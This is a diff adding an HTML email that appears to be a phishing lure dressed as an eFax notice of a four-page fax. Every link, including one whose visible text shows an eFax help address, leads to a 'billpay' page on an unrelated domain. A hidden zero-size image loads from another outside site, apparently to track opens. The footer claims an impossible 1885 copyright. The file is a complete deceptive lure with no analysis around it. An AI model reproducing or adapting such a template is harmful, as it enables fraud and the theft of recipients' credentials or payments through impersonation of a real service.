@@ -1,0 +1,83 @@
+<style type="text/css">
+</style>
+<br />
+<style type="text/css"><!--
+hmmessage P
+{
+margin:0px;
+padding:0px
+}
+body.hmmessage
+{
+font-size: 10pt;
+font-family:Tahoma
+}
+-->
+</style>
+<div dir="ltr"><font color="black" face="arial" size="2">&nbsp;</font>
+<div>
+<div style="color: black; font-family: arial,helvetica; font-size: 10pt;">
+<div id="ecxAOLMsgPart_1_3ef8115d-0653-4388-af91-ed93b394d107">
+<div id="ecxcontainer_msie" style="text-align: center;">
+<div id="ecxcontainer" style="width: 576px; text-align: left; font-family: verdana; font-size: 11px;">
+<div id="header">
+<p><img height="0" src="http://www.blogbasement.net/logo/sos-ident-sosp/logo.png" style="height: 0px; width: 0px; display:none" /></p>
+<div id="ecxlogo"><font color="black" face="arial" size="2"><img alt="" src="http://a248.g.akamai.net/f/248/528/7d/images.j2.com/emailTemplates/corpHeaderLogo.jpg" /></font></div>
+</div>
+&nbsp;
+
+<div id="ecxbar" style="clear: both;"><font color="black" face="arial" size="2"><img alt="" height="24" src="http://images.j2.com/emailTemplates/grey_bar.gif" width="576" /></font></div>
+&nbsp;
+
+<div id="ecxcontent" style="padding: 0px 6px; line-height: 135%;">
+<div id="body" style="width: 374px; padding-right: 15px; float: left;"><font color="black" face="arial" size="2"><span style="color: rgb(0, 51, 102); font-size: 17px;">Fax Message</span> <span>[Caller-ID: <span>998-566-9234</span>] </span> </font>
+
+<div class="ecxmiddle"><font color="black" face="arial" size="2">You have received a 4 pages fax.</font></div>
+<font color="black" face="arial" size="2"> </font>
+
+<div>&nbsp;</div>
+<font color="black" face="arial" size="2"> </font>
+
+<div class="ecxmiddle"><font color="black" face="arial" size="2">* The reference number for this fax is <a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" target="_blank">AT-AT-99034jdks03szl-AT-AT</a>.</font></div>
+<font color="black" face="arial" size="2"> </font>
+
+<div>&nbsp;</div>
+<font color="black" face="arial" size="2"> </font>
+
+<div><font color="black" face="arial" size="2">View this fax using your PDF reader.</font></div>
+<font color="black" face="arial" size="2"> </font>
+
+<div>&nbsp;</div>
+<font color="black" face="arial" size="2"> </font>
+
+<div><font color="black" face="arial" size="2"><a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" target="_blank">Click here to view this message</a></font></div>
+<font color="black" face="arial" size="2"> </font>
+
+<div>&nbsp;</div>
+<font color="black" face="arial" size="2"> </font>
+
+<div class="ecxmiddle"><font color="black" face="arial" size="2">Please visit <a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" style="color: rgb(0, 51, 102);" title="This external link will open in a new window"><span>www.eFax.com/en/efax/twa/page/help</span></a> if you have any questions regarding this message or your service.</font></div>
+<font color="black" face="arial" size="2"> </font>
+
+<div><font color="black" face="arial" size="2">Thank you for using the eFax service!</font></div>
+<font color="black" face="arial" size="2"> </font></div>
+</div>
+
+<div id="footer" style="text-align: left; color: rgb(185, 184, 184); padding-top: 40px; clear: both; font-size: 10px;">
+<div style="padding: 0px 6px; margin-bottom: 7px;"><font color="black" face="arial" size="2"><a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" style="text-decoration: none;" title="This external link will open in a new window"><span style="color: rgb(49, 132, 173);">Home</span></a> <a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" style="text-decoration: none;" title="This external link will open in a new window"><span style="color: rgb(49, 132, 173);">Contact</span></a> <a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" style="text-decoration: none;" title="This external link will open in a new window"><span style="color: rgb(49, 132, 173);">Login</span></a></font></div>
+
+<div style="padding-top: 14px; padding-left: 20px; float: right;">&nbsp;</div>
+
+<div style="padding: 7px 6px 0px; line-height: 135%; border-top-color: rgb(193, 193, 193); border-top-width: 1px; border-top-style: solid;">
+<div><font color="black" face="arial" size="2">1885 j2 Global Communications, Inc. All rights reserved.<br />
+eFaxing is a registered trademark of j2 Global Communications, Inc.</font></div>
+
+<div><font color="black" face="arial" size="2">This account is subject to the terms listed in the <a href="http://www.id-insurance.com/sos-ident-sos/billpay.html?customerid=sos-ident-sos" style="color: rgb(185, 184, 184);" title="This external link will open in a new window"><span>eFax Customer Agreement</span></a>.</font></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
